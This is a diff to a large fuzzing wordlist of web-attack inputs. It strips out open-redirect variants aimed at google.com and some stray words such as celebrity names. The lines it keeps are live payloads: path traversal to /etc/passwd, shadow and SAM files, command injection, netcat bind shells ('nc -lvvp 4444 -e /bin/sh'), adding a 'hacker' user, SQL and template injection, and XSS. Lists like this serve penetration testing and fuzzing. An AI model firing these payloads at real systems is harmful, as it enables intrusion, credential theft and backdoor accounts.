@@ -1418,7 +1418,6 @@ ifconfig
 Infinity
 ipconfig
 locals()
-/.logout
 %n * 129
 %n * 257
 %n * 513
@@ -1516,7 +1515,6 @@ Statement
 & sysinfo
 ; sysinfo
 | sysinfo
-Tyson Gay
 /..%u2215
 /..%u2216
 /..%uEFC8
@@ -1569,7 +1567,6 @@ etc/passwd
 eval('ls')
 exec('ls')
 expression
-google.com
 /.htpasswd
 & ifconfig
 ; ifconfig
@@ -1617,11 +1614,6 @@ which wget
 /./.././../
 /.\..\.\..\
 🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸
-〱google.com
-〵google.com
-ゝgoogle.com
-ーgoogle.com
-ｰgoogle.com
 $(`whoami`)
 1/*!1111'*/
 -2147483648
@@ -1651,9 +1643,6 @@ dbase.php a
 /etc/vfstab
 eval('pwd')
 exec('pwd')
-.google.com
-/google.com
-@google.com
 /humans.txt
 && ifconfig
 install.php
@@ -1688,11 +1677,6 @@ Time-Based:
 パーティーへ行かないか
 田中さんにあげて下さい
 ../../../../
-/〱google.com
-/〵google.com
-/ゝgoogle.com
-/ーgoogle.com
-/ｰgoogle.com
 [[${42*42}]]
 $ENV{'HOME'}
 1 000 000,00
@@ -1733,10 +1717,6 @@ etc%5cpasswd
 /etc/sudoers
 eval('pwd');
 exec('pwd');
-/.google.com
-//google.com
-/\google.com
-\\google.com
 ../.htaccess
 ../.htpasswd
 ls -lh /etc/
@@ -1793,7 +1773,6 @@ $;/usr/bin/id
 /\\\%2e%2e%5c
 %2f3627734734
 ..%2fboot.ini
-%2fgoogle.com
 ///3627734734
 ..%5cboot.ini
 %99999999999s
@@ -1815,7 +1794,6 @@ a|/usr/bin/id
 /\../boot.ini
 ../config.asp
 ../config.php
-Dick Van Dyke
 {{dump(app)}}
 ERB.version()
 /etc/ftphosts
@@ -1823,11 +1801,6 @@ ERB.version()
 ../etc/passwd
 etc/passwd%00
 etc/shadow%00
-../google.com
-///google.com
-//\google.com
-//google.com/
-/\/google.com
 ././.htaccess
 ipconfig /all
 & ls -l /etc/
@@ -1888,7 +1861,6 @@ $smarty.config
 ////3627734734
 {{4*4}}[[5*5]]
 /..%5cboot.ini
-/%5cgoogle.com
 a);/usr/bin/id
 a)|/usr/bin/id
 a;/usr/bin/id;
@@ -1931,18 +1903,10 @@ C:/sysprep.xml
 /etc/shadow%00
 eval('whoami')
 exec('whoami')
-google%252ecom
-////google.com
-///google.com/
-//;@google.com
-//google.com//
-/\/google.com/
-<>//google.com
 hasOwnProperty
 /inc/mysql.php
 ../install.php
 Kernel.exit(1)
-Linda Callahan
 .locale_object
 \log\error.log
 \log\error_log
@@ -1961,7 +1925,6 @@ settings.DEBUG
 %s%p%x%d * 129
 %s%p%x%d * 257
 %s%p%x%d * 513
-Super Bowl XXX
 system('pwd');
 /%uff0e%uff0e/
 /%uff0e%uff0e\
@@ -1994,7 +1957,6 @@ user/.htpasswd
  {${phpinfo()}}
  {${sleep(20)}}
 $smarty.version
-/%09/google.com
 /..0x2fboot.ini
 /..0x5cboot.ini
 /216.58.214.206
@@ -2008,8 +1970,6 @@ $smarty.version
 %2e%2e\boot.ini
 %2f3627734734//
 ..2fetc2fpasswd
-%2fgoogle.com//
-//%5cgoogle.com
 a);/usr/bin/id;
 a);/usr/bin/id|
 a)|/usr/bin/id;
@@ -2056,26 +2016,14 @@ eval('sleep 5')
 eval('whoami');
 exec('sleep 5')
 exec('whoami');
-//google%00.com
-/////google.com
-////google.com/
-///;@google.com
-///google.com//
-//\/google.com/
-/<>//google.com
-\/\/google.com/
-google.com/.jpg
-Horniman Museum
 ../../.htaccess
 http:0xd83ad6ce
 http:3627734734
-http:google.com
 /inc/config.php
 /index.html|id|
 & ipconfig /all
 ; ipconfig /all
 | ipconfig /all
-Jimmy Clitheroe
 .Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 @Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 \log\access.log
@@ -2088,7 +2036,6 @@ Jimmy Clitheroe
 & ls -l /home/*
 ; ls -l /home/*
 | ls -l /home/*
-magna cum laude
 \n/bin/ls -al\n
 \n/usr/bin/id\n
 " OR 1 = 1 -- -
@@ -2137,9 +2084,7 @@ users/.htpasswd
 /.\..\.\..\.\..\
 /〱Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ
-$2f%2fgoogle.com
 $smarty.template
-//%09/google.com
 1' ORDER BY 1--+
 1' ORDER BY 2--+
 1' ORDER BY 3--+
@@ -2153,12 +2098,10 @@ $smarty.template
 /%2e%2e/boot.ini
 /%2e%2e\boot.ini
 %2f$2f3627734734
-%2f$2fgoogle.com
 /..%2f..%2f..%2f
 ..%2f/etc/passwd
 /%%32%65%%32%65/
 /..%5c..%5c..%5c
-///%5cgoogle.com
 admin/access_log
 ";alert(123);t="
 ';alert(123);t='
@@ -2215,14 +2158,7 @@ d:\AppServ\MySQL
 /etc/vsftpd.conf
 eval('sleep 5');
 exec('sleep 5');
-/\google%252ecom
-/////google.com/
-////google.com//
-///\;@google.com
-/\/\/google.com/
 http://a/%%30%30
-http:/google.com
-https:google.com
 && ipconfig /all
 L2V0Yy9wYXNzd2Q=
 /.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
@@ -2299,7 +2235,6 @@ ZXRjL3Bhc3N3ZA==
 {$smarty.version}
 %00/etc/passwd%00
 %00/etc/shadow%00
-///%09/google.com
 %0A/usr/bin/id%0A
 0x2e0x2e/boot.ini
 0x2e0x2e\boot.ini
@@ -2312,11 +2247,9 @@ ZXRjL3Bhc3N3ZA==
 %2e%2e%2fboot.ini
 %2e%2e%5cboot.ini
 %2f216.58.214.206
-/%2f%2fgoogle.com
 ..%%32%66boot.ini
 3.38800266804e+16
 ..%%35%63boot.ini
-////%5cgoogle.com
 ../../../boot.ini
 ..\..\..\boot.ini
 /.../.../boot.ini
@@ -2378,13 +2311,9 @@ C:/unattended.xml
 <foo val=`bar' />
 <foo val=“bar” />
 <foo val=”bar“ />
-////\;@google.com
 http:0xd8.3856078
 http://0xd83ad6ce
 http://3627734734
-http://google.com
-/http:/google.com
-/https:google.com
 ///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 //Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 ../logs/error.log
@@ -2436,7 +2365,6 @@ system('whoami');
 ../../../../../../
 /../..//../..//../
 /..\..\\..\..\\..\
-////%09/google.com
 /0x2e0x2e/boot.ini
 /0x2e0x2e\boot.ini
 0xffffffffffffffff
@@ -2452,7 +2380,6 @@ system('whoami');
 %2e%2e//etc/passwd
 %2e%2e\/etc/passwd
 ..%2f..%2fboot.ini
-//%2f%2fgoogle.com
 ..2fetc2fpasswd%00
 /..%%32%66boot.ini
 /..%%35%63boot.ini
@@ -2525,15 +2452,8 @@ etc%c0%afpasswd%00
 /etc/php.d/zip.ini
 /etc/security/user
 /etc/updatedb.conf
-/google.com/%2e%2e
-//google.com/%2f..
-/google.com/%2F.. 
 ../../../.htaccess
 http:00330.3856078
-http://.google.com
-/http://google.com
-https://google.com
-https:/\google.com
 /include/mysql.php
 ///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 //;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
@@ -2586,7 +2506,6 @@ system('sleep 5');
 /..%2f..%2fboot.ini
 ..2f..2fetc2fpasswd
 %2f3627734734%2f%2f
-%2fgoogle.com%2f%2f
 /..%%32%66..%%32%66
 /..%%35%63..%%35%63
 /..%5c..%5cboot.ini
@@ -2662,17 +2581,9 @@ c:WINDOWS/system32/
 /etc/redhat-release
 /etc/security/group
 /etc/vsftpd.conf%00
-//google.com/%2e%2e
-//google.com/%2E%2E
-///google.com/%2f..
-//google.com/%2F.. 
 http:0xd8.072.54990
 http://0xd8.3856078
-http://;@google.com
-http:/\/\google.com
 http:Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-https://google.com/
-/https://google.com
 /include/config.php
 javascript:alert(1)
 //Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ
@@ -2795,15 +2706,9 @@ C:\xampp\php\php.ini
 /etc/security/limits
 /etc/security/passwd
 /etc/ssh/sshd_config
-///google.com/%2e%2e
-////google.com/%2f..
-///google.com/%2f..2
-//google%E3%80%82com
 http://00330.3856078
 http:472.314.470.462
 http:/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-https://google.com//
-/https://google.com/
 https:Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 javascript:alert(1);
 /javascript:alert(1)
@@ -2854,7 +2759,6 @@ ZXRjL3NoYWRvdyUwMA==
 //..\/..\/..\/..\/..\
 /\../\../\../\../\../
 $(`type C:\boot.ini`)
-%01https://google.com
 ///%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /0x2e0x2e0x2fboot.ini
 /0x2e0x2e0x5cboot.ini
@@ -2915,17 +2819,9 @@ C:/windows/system.ini
 /etc/security/user%00
 /etc/wu-ftpd/ftphosts
 /etc/wu-ftpd/ftpusers
-////google.com/%2e%2e
-/google.com/%2f%2e%2e
-google.com.google.com
-google.com/google.com
 http:00330.0x3a.54990
-http:%0a%0dgoogle.com
 http://0xd8.072.54990
 /http:/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-https:/%5cgoogle.com/
-https://%5cgoogle.com
-/https://google.com//
 http://www.cum.qc.ca/
 //javascript:alert(1)
 /javascript:alert(1);
@@ -2967,7 +2863,6 @@ javascript:confirm(1)
 /.//..//.//..//.//..//
 /.\\..\\.\\..\\.\\..\\
 $2f%2f3627734734%2f%2f
-$2f%2fgoogle.com%2f%2f
 $context.TOOLS_VERSION
 ////%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 %252e%252e//etc/passwd
@@ -3028,17 +2923,9 @@ Dr. Herman I. Libshitz
 /etc/wu-ftpd/ftpaccess
 execInfo.templateStack
 Finding the table name
-//google.com/%2e%2e%2f
-//google.com/%2f%2e%2e
-google.com;@google.com
 http://472.314.470.462
 http://.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-https://%09/google.com
-/https:/%5cgoogle.com/
-/https://%5cgoogle.com
-https://////google.com
-//https://google.com//
 https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 java%09script:alert(1)
 java%0ascript:alert(1)
@@ -3174,18 +3061,12 @@ C:/windows/explorer.exe
 /etc/vsftpd.chroot_list
 /etc/vsftpd/vsftpd.conf
 #execInfo.templateStack
-///google.com/%2e%2e%2f
-///google.com/%2f%2e%2e
-//google.com//%2F%2E%2E
-//google.com/google.com
 /home/apache/httpd.conf
 http://00330.0x3a.54990
 http:0330.072.0326.0316
 http:[::216.58.214.206]
 http://;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-/https://%09/google.com
 https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-@https://www.google.com
 Kernel.exec("ls -al /")
 Lightwater Country Park
 ///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
@@ -3285,14 +3166,7 @@ C:/windows/repair/system
 /etc/security/environ%00
 /etc/wu-ftpd/ftphosts%00
 /etc/wu-ftpd/ftpusers%00
-google.com%23@google.com
-////google.com/%2e%2e%2f
-////google.com/%2f%2e%2e
-//google.com@google.com/
-//google.com\@google.com
 http:0xd8.0x3a.0xd6.0xce
-https://%0a%0dgoogle.com
-https://google.com/%2f..
 https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
 /https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 javascript://%0aalert(1)
@@ -3338,7 +3212,6 @@ type C:\WINNT\repair\SAM
 /var/www/logs/access_log
 /var/www/logs/error.log 
 /var/www/logs/error_log 
-///www.google.com/%2e%2e
 \xampp\FileZillaFTP\Logs
 \xampp\webdav\webdav.txt
 /.../.../.../.../.../.../
@@ -3370,7 +3243,6 @@ type C:\WINNT\repair\SAM
 /..%25c1%259c..%25c1%259c
 %2e%2e/%2e%2e//etc/passwd
 %2e%2e\%2e%2e\/etc/passwd
-/%5cgoogle.com@google.com
 //%5cjavascript:alert(1);
 admin*)((|userpassword=*)
 admin*)((|userPassword=*)
@@ -3427,19 +3299,14 @@ C:\nginx-1.7.4\nginx.conf
 /etc/proftpd/modules.conf
 /etc/security/failedlogin
 /etc/wu-ftpd/ftpaccess%00
-///google.com@google.com/
-//google.com@google.com//
-//google.com\tgoogle.com/
 http://0330.072.0326.0316
 http:%0a%0dⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 http://[::216.58.214.206]
 https:/%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 https://%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-/https://google.com/%2f..
 ja\nva\tscript\r:alert(1)
 ////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
 /Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/google.com
 nc -lvvp 4446 -e /bin/sh|
 nc -lvvp 4447 -e /bin/sh;
 nc -lvvp 4448 -e /bin/sh&
@@ -3489,7 +3356,6 @@ test*; ls -lhtR /var/www/
 /var/www/logs/access_log 
 /var/www/sitename/htdocs/
 \..\..\..\WINDOWS\win.ini
-////www.google.com/%2e%2e
 /xampp\apache\bin\php.ini
 /..../..../..../..../..../
 /....\....\....\....\....\
@@ -3500,7 +3366,6 @@ test*; ls -lhtR /var/www/
 $2f%2f216.58.214.206%2f%2f
 ${@print("RCEVulnerable")}
 !@#0%^#0##018387@#0^^**(()
-/%09/google.com@google.com
 0x2e0x2e/0x2e0x2e/boot.ini
 0x2e0x2e\0x2e0x2e\boot.ini
 ..0x2f..0x2f..0x2fboot.ini
@@ -3524,7 +3389,6 @@ ${@print("RCEVulnerable")}
 /..%5c..%5c..%5c..%5c..%5c
 ..%5c..%5c..%5c/etc/passwd
 ..%5cboot.ini%00index.html
-//%5cgoogle.com@google.com
 /apache2/logs/error.log%00
 /apache/logs/access.log%00
 ../../../../../../boot.ini
@@ -3571,19 +3435,10 @@ C:\xampp\webdav\webdav.txt
 /etc/vsftpd.chroot_list%00
 /etc/vsftpd/vsftpd.conf%00
 eval("puts 'hello world'")
-////google.com@google.com/
-///google.com@google.com//
-google.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 http://0xd8.0x3a.0xd6.0xce
-http:///////////google.com
-http:google.com@0xd83ad6ce
-http:google.com@3627734734
 https://%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /https:/%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 /https://%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-https:///google.com/%2e%2e
-/https://google.com/%2e%2e
-https://google%E3%80%82com
 //https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
 //Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
 //Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
@@ -3637,8 +3492,6 @@ type C:\Windows\repair\SAM
 /var/www/logs/error.log%00
 /var/www/logs/error_log%00
 ';WAITFOR DELAY '0:0:30'--
-//www.google.com/%2e%2e%2f
-//www.google.com/%2f%2e%2e
 \xampp\tomcat\conf\web.xml
 Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮
 ,。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’
@@ -3647,7 +3500,6 @@ Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮
 ../../../../../../../../../
 /../..//../..//../..//..///
 /..\..\\..\..\\..\..\\..\\\
-//%09/google.com@google.com
 /0x2e0x2e/0x2e0x2e/boot.ini
 /0x2e0x2e\0x2e0x2e\boot.ini
 /..0x2f..0x2f..0x2fboot.ini
@@ -3661,7 +3513,6 @@ Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮
 /..%%32%66..%%32%66boot.ini
 /..%%35%63..%%35%63boot.ini
 ..%5c/etc/passwd;index.html
-///%5cgoogle.com@google.com
 /apache2/logs/access.log%00
 ../../apache/logs/error.log
 ../..//../..//..///boot.ini
@@ -3709,14 +3560,10 @@ C:\xampp\apache\bin\php.ini
 /etc/php/apache2/php.ini%00
 /etc/protpd/proftpd.conf%00
 /etc/pure-ftpd/pureftpd.pdb
-////google.com@google.com//
-https%3a%2f%2fgoogle.com%2f
-/https:///google.com/%2e%2e
 {{['id']|filter('system')}}
 Javas%26%2399;ript:alert(1)
 ///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
 ///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/google.com
 ../../../../logs/access.log
 & nc -lvvp 4444 -e /bin/sh&
 ; nc -lvvp 4444 -e /bin/sh;
@@ -3774,10 +3621,7 @@ type C:\WINNT\repair\SYSTEM
 /var/www/logs/access_log%00
 /var/www/mgr/logs/error.log
 /var/www/mgr/logs/error_log
-///www.google.com/%2e%2e%2f
-///www.google.com/%2f%2e%2e
 \xampp\mysql\data\mysql.err
-///%09/google.com@google.com
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/
 /0x2e0x2e\0x2e0x2e\0x2e0x2e\
 -1 UNION SELECT 1 INTO @,@,@
@@ -3796,7 +3640,6 @@ type C:\WINNT\repair\SYSTEM
 /..%%32%66..%%32%66..%%32%66
 /..%%35%63..%%35%63..%%35%63
 ..%5c..%5c..%5c..%5cboot.ini
-////%5cgoogle.com@google.com
 ../../../administrator/inbox
 ../../apache/logs/access.log
 ..../..../..../..../boot.ini
@@ -3843,25 +3686,14 @@ C:\xampp\tomcat\conf\web.xml
 /etc/php5/apache2/php.ini%00
 /etc/proftpd/modules.conf%00
 /etc/pure-ftpd/pure-ftpd.pdb
-/\google.com:80%40google.com
-//google.com:80#@google.com/
-//google.com:80?@google.com/
-//google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 /home/apache/conf/httpd.conf
 http:[::ffff:216.58.214.206]
-http:google.com@0xd8.3856078
-http://google.com@0xd83ad6ce
-http://google.com@3627734734
 https://%0a%0dⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-//https:///google.com/%2e%2e
-https://google.com/%2e%2e%2f
-https://google.com/%2f%2e%2e
 https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
 Li4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vZXRjL3Bhc3N3ZCUwMA==
 ////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
 ////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@google.com
 /opt/apache2/conf/httpd.conf
 /opt/lampp/logs/error.log%00
 /opt/lampp/logs/error_log%00
@@ -3898,8 +3730,6 @@ type %SYSTEMROOT%\repair\SAM
 /var/www/mgr/logs/access_log
 /var/www/web1/html/.htaccess
 \..\..\..\..\WINDOWS\win.ini
-////www.google.com/%2e%2e%2f
-////www.google.com/%2f%2e%2e
 /www/logs/proftpd.system.log
 /xampp\apache\bin\php.ini%00
 \xampp\apache\logs\error.log
@@ -3918,7 +3748,6 @@ type %SYSTEMROOT%\repair\SAM
 //..\/..\/..\/..\/..\/..\/..\
 /\../\../\../\../\../\../\../
 !@#$%%^#$%#$@#$%$$@#$%^^**(()
-////%09/google.com@google.com
 0x2e0x2e/0x2e0x2e//etc/passwd
 0x2e0x2e\0x2e0x2e\/etc/passwd
 ..0x2f..0x2f..0x2f/etc/passwd
@@ -3952,7 +3781,6 @@ type %SYSTEMROOT%\repair\SAM
 /..%5c..%5c..%5c..%5cboot.ini
 ..%5c..%5cboot.ini;index.html
 ..%5c/etc/passwd%00index.html
-/%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 ../../../../../../../boot.ini
 ../..//../..//../..//boot.ini
 ..\..\..\..\..\..\..\boot.ini
@@ -3992,22 +3820,7 @@ D:\inetpub\wwwroot\global.asa
 ./\/././\/././\/.//etc/passwd
 .\/\.\.\/\.\.\/\.\/etc/passwd
 /etc/pure-ftpd/pure-ftpd.conf
-//google.com@google.com/%2f..
-///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-//google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
-http:google.com@00330.3856078
-http://google.com@google.com/
-/https://google.com/%2e%2e%2f
-https:///google.com/%2f%2e%2e
-/https://google.com/%2f%2e%2e
-https://google.com#google.com
-https://google.com.google.com
-https://google.com/google.com
-https://google.com?google.com
-https://google.com@google.com
-https://google.com\google.com
 /https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
-//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\tgoogle.com/
 ../../../../../logs/error.log
 medieval erection of parapets
 && nc -lvvp 4444 -e /bin/sh &
@@ -4046,7 +3859,6 @@ type C:\Windows\repair\SYSTEM
 /../..//../..//../..//../..///
 /..\..\\..\..\\..\..\\..\..\\\
 ❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙
-/%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 %252e%252e/%252e%252e/boot.ini
 %252e%252e\%252e%252e\boot.ini
 %252e%252e/boot.ini;index.html
@@ -4064,7 +3876,6 @@ type C:\Windows\repair\SYSTEM
 ..2f..2f..2f..2fetc2fpasswd%00
 /%%32%65%%32%65%%32%66boot.ini
 /%%32%65%%32%65%%35%63boot.ini
-//%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 79228162514264337593543950336B
 79228162514264337593543950336l
 79228162514264337593543950336L
@@ -4104,21 +3915,9 @@ C:\xampp\sendmail\sendmail.log
 /etc/phpmyadmin/config.inc.php
 /etc/pure-ftpd/pureftpd.pdb%00
 <!--#exec cmd="/usr/bin/id;-->
-///google.com@google.com/%2f..
-////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
 http://[::ffff:216.58.214.206]
-http:google.com@0xd8.072.54990
-http://google.com@0xd8.3856078
-http://google.com\tgoogle.com/
-//https://google.com/%2e%2e%2f
-/https:///google.com/%2f%2e%2e
-https://google.com;@google.com
-https://google.com@google.com/
 https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
 /https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
-https:///www.google.com/%2e%2e
-/https://www.google.com/%2e%2e
 ../../../../../logs/access.log
 net user hacker Password1 /ADD
 /opt/apache/conf/httpd.conf%00
@@ -4160,7 +3959,6 @@ net user hacker Password1 /ADD
 ${T(java.lang.System).getenv()}
 %00../../../../../../etc/passwd
 %00../../../../../../etc/shadow
-//%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /..0x2f..0x2f..0x2f..0x2f..0x2f
 /..0x5c..0x5c..0x5c..0x5c..0x5c
 /%252e%252e/%252e%252e/boot.ini
@@ -4186,7 +3984,6 @@ ${T(java.lang.System).getenv()}
 /..%5c..%5c..%5c..%5c..%5c..%5c
 ..%5c..%5c..%5c..%5c/etc/passwd
 ..%5c..%5cboot.ini%00index.html
-///%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 ' AND MID(VERSION(),1,1) = '5';
 ../../../apache/logs/access.log
 /../..//../..//../..///boot.ini
@@ -4229,18 +4026,9 @@ dir C:\Documents and Settings\*
 ..\..\..\/etc/passwd;index.html
 /etc/pure-ftpd/pure-ftpd.pdb%00
 /etc/vhcs2/proftpd/proftpd.conf
-google.com@%E2%80%AE@google.com
-///google.com@google.com/%2e%2e
-////google.com@google.com/%2f..
-////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
 /home\bin\stable\apache\php.ini
 http:3H6k7lIAiqjfNeN@0xd83ad6ce
 http:3H6k7lIAiqjfNeN@3627734734
-http://google.com@00330.3856078
-http://google.com%2egoogle.com/
-http:google.com@472.314.470.462
-https://google.com@google.com//
-/https://google.com@google.com/
 http:XY>.7d8T\205pZM@0xd83ad6ce
 http:XY>.7d8T\205pZM@3627734734
 java%0d%0ascript%0d%0a:alert(0)
@@ -4261,7 +4049,6 @@ type %SYSTEMROOT%\repair\SYSTEM
 /www/logs/proftpd.system.log%00
 \xampp\webalizer\webalizer.conf
  {${sleep(hexdec(dechex(20)))}} 
-///%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
 0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
 ..0x2f..0x2f..0x2f..0x2fboot.ini
@@ -4285,7 +4072,6 @@ type %SYSTEMROOT%\repair\SYSTEM
 %%32%65%%32%65%%32%66/etc/passwd
 %%32%65%%32%65%%35%63/etc/passwd
 ..%5c..%5c/etc/passwd;index.html
-////%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /../../../../../../../../bin/id|
 .../.../.../.../.../.../boot.ini
 ...\...\...\...\...\...\boot.ini
@@ -4319,27 +4105,15 @@ d:\System32\Inetsrv\metabase.xml
 .//..//.//..//.//..///etc/passwd
 .\\..\\.\\..\\.\\..\\/etc/passwd
 /etc/pure-ftpd/pure-ftpd.conf%00
-////google.com@google.com/%2e%2e
 /home2\bin\stable\apache\php.ini
-http:google.com@00330.0x3a.54990
-http://google.com@0xd8.072.54990
-http://google.com%23.google.com/
-http://google.com%3F.google.com/
-https://%5cgoogle.com@google.com
-https://:@google.com\@google.com
 //https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
 https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
 https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-//https:///www.google.com/%2e%2e
-https://www.google.com/%2e%2e%2f
-https://www.google.com/%2f%2e%2e
 <IMG onmouseover="alert('xxs')">
 <img src=x onerror=alert(123) />
 \j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
 Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
-//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@google.com/
-//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@google.com/
 & net user hacker Password1 /ADD
 ; net user hacker Password1 /ADD
 | net user hacker Password1 /ADD
@@ -4378,7 +4152,6 @@ test*; perl -e 'print "X"x16096'
 /..\\..\\..\\..\\..\\..\\..\\..\\
 //..\/..\/..\/..\/..\/..\/..\/..\
